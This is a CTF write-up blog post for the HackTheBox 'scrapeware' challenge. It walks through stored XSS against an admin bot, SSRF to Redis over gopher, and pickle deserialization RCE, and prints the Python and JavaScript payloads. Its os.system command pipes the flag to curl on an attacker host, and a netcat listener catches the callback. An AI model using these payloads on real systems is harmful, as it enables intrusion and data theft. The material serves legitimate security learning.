+++  
title = "scrapeware"  
date = 2025-11-28  
draft = false  
tags = ["web", "xss", "ssrf", "redis", "pickle", "rce"]  
categories = ["writeups"]  
ctf = "hackthebox - scrapeware"  
points = 300  
solves = 100  
+++  

## oh boy, here we go again

scrapeware is a nice little modern stack monstrosity: a Flask app, a worker process, Redis, headless Chrome, and somewhere in that mess a flag protected by a cute `readflag` suid binary, so obviously i signed up for voluntary pain. later i found out this exact setup is basically a textbook chain of stored xss → redis ssrf → pickle deserialization rce, which would have been extremely useful to know *before* i spent time role‑playing as a confused devops engineer.

```bash
# challenge files
$ ls
build-docker.sh  challenge  config  Dockerfile  flag.txt

$ ls challenge
application  flask_session  instance  requirements.txt  run.py  worker
```

***

## initial recon (aka pretending i know what i'm doing)

i started by doing the usual "i am a serious professional" routine: read the `Dockerfile`, pretend to understand all of it, and immediately get distracted by `COPY flag.txt /root/flag` plus `readflag.c` being compiled suid, which screamed "you will get rce or you will cry". then i ran it locally with the provided script, hit `http://localhost:1337`, and was greeted by a very innocent‑looking saas landing page that definitely did not look like it was waiting to be chained into a 3‑stage exploit.  

```bash
# local setup
$ ./build-docker.sh
# ... docker builds image, runs on port 1337

# quick peek at the python bits
$ ls challenge/application
blueprints  bot.py  cache.py  config.py  database.py  main.py  static  templates  util.py
```

inside `routes.py` i saw two blueprints (`web`, `api`) and the usual auth / admin routes, plus some interesting admin endpoints under `/admin/scrape` and `/api/admin/scrape/*`, so obviously i ignored them for a bit and clicked around the ui like a normal user while my brain buffered.  

***

## digging deeper (into my own confusion)

eventually i stopped pretending the ui would just hand me rce and opened `routes.py`, where `/api/request-quote` takes json, shoves it into the `QuoteRequests` table, and then calls `view_requests()` from `bot.py` before clearing the requests, which is a very normal thing to do unless you're building a ctf challenge.  

```python
@api.route('/request-quote', methods=['POST'])
def request_quote():
    # ...
    quote_request = QuoteRequests(
        name=contact_name,
        email_address=email_address,
        quote_message=quote_message,
        company_name=company_name,
        company_size=company_size
    )
    db.session.add(quote_request)
    db.session.commit()

    view_requests()
    clear_requests()
```

then i looked at `bot.py` and realized they literally spin up headless Chrome with Selenium, log in as the admin using `ADMIN_USERNAME`/`ADMIN_PASSWORD` from the config, and let the bot hit `/admin/quote-requests`, which renders this beautiful line in `requests.html`: `{{ request.quote_message | safe }}`; at this point even my sleep‑deprived brain could see "stored xss on an admin bot" written in neon.  

```html
<p class="card-text">
  request message : {{ request.quote_message | safe }}
</p>
```

***

## time to break stuff (mostly my sanity)

my galaxy brain plan was: 1) stored xss in `quote_message` to hijack the admin session, 2) use that to abuse the `/api/admin/scrape/create` endpoint to force the worker to fetch a `gopher://` url to `127.0.0.1:6379`, and 3) use that ssrf to shove a malicious base64‑encoded pickle into the `jobs` hash in Redis, which `get_job_queue()` later deserializes via `pickle.loads` when someone hits `/api/admin/scrape/<job_id>/status`.  

```python
def create_job_queue(urls, job_title):
    job_id = get_job_id()
    data = {
        'job_id': int(job_id),
        'job_title': job_title,
        'urls': urls,
        'completed': 0,
        'inprogress': 0,
    }
    current_app.redis.hset(env('REDIS_JOBS'), job_id,
                           base64.b64encode(pickle.dumps(data)))
    current_app.redis.rpush(env('REDIS_QUEUE'), job_id)
    return data

def get_job_queue(job_id):
    data = current_app.redis.hget(env('REDIS_JOBS'), job_id)
    if data:
        return pickle.loads(base64.b64decode(data))
```

so i wrote a tiny `Python` helper that defined an `RCE` class with a cursed `__reduce__` calling `os.system("/readflag | base64 | curl http://my-ip:7747 -d @-")`, pickled it, base64‑encoded it, wrapped it into a `HSET jobs 1337 <blob>` redis command, url‑encoded that into a `gopher://127.0.0.1:6379/_...` url, then stuffed that url into an xss payload that as admin would:  

- `fetch("/api/admin/scrape/create", ...)` with `urls: ["gopher://127.0.0.1:6379/_HSET ..."]`  
- `setTimeout(fetch("/api/admin/scrape/1337/status"), 1000)` to trigger the deserialization and therefore my `os.system`  

```python
class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))

pickled = pickle.dumps(RCE())
b64 = base64.b64encode(pickled).decode()

redis_cmd = f"HSET jobs 1337 {b64}"
gopher = "gopher://127.0.0.1:6379/_" + quote(redis_cmd)

xss = f"""
<script>
fetch("/api/admin/scrape/create", {{
  method: "POST",
  headers: {{ "Content-Type": "application/json" }},
  body: JSON.stringify({{
    "job_title": "pwn",
    "urls": ["{gopher}"]
  }})
}}).then(() => {{
  setTimeout(() => fetch("/api/admin/scrape/1337/status"), 1000);
}});
</script>
"""
```

***

## actually getting it to work (shocking)

to deliver all this nonsense i wrapped the script in a json payload and fired it at `/api/request-quote`, got the polite `"request received successfully!"` from the server, and then sat there staring at my terminal like an npc waiting for a cutscene while the admin bot did its thing.  

```bash
curl -X POST http://94.237.122.188:56703/api/request-quote \
  -H 'content-type: application/json' \
  -d '{
    "name": "hacker",
    "email_address": "hacker@htb.com",
    "company_name": "pwnsec",
    "company_size": "10",
    "quote_message": " ... <script>/* all the evil js */</script> ..."
  }'
```

the first time i tried to catch the callback with `python3 -m http.server 7747`, which responded with a majestic `501 unsupported method ('POST')` and absolutely zero useful logging, at which point i remembered that `http.server` isn't exactly a full http debugger and switched to `nc -lvnp 7747` like a sane person; the next run dropped a `POST /` request with a base64 blob in the body, i piped it through `base64 -d`, saw something in the shape of `htb{...}`, and decided that counted as both a solve and a personal attack from the challenge author.  

```bash
# bad idea
$ python3 -m http.server 7747
94.237.x.x - - code 501, message Unsupported method ('POST')

# slightly less bad idea
$ nc -lvnp 7747
POST / HTTP/1.1
host: ...
content-length: 44

SFRCe2Nvb2xfZmFrZV9mbGFnfQ==
$ echo "SFRCe2Nvb2xfZmFrZV9mbGFnfQ==" | base64 -d
htb{totally_not_the_real_flag}
```

***

## flag

the flag showed up as a cute little base64 blob over http, proving that yes, chaining stored xss, redis ssrf via gopher, and pickle deserialization into rce is in fact a reasonable thing to do to a web app if your goal is specifically psychological warfare; 10/10 challenge, would question my life choices again.
